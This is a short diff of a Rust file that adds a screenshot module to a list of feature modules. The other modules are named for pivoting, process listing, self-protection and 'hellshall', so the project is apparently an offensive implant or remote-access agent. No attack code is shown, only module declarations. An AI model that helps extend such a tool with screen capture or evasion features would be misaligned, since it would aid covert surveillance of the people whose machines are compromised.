@@ -14,6 +14,7 @@ mod features {
     pub mod executeDOT;
     pub mod list_processes;
     pub mod pivot;
+    pub mod screenshot;
 }
 mod hellshall;
 mod selfprotect;
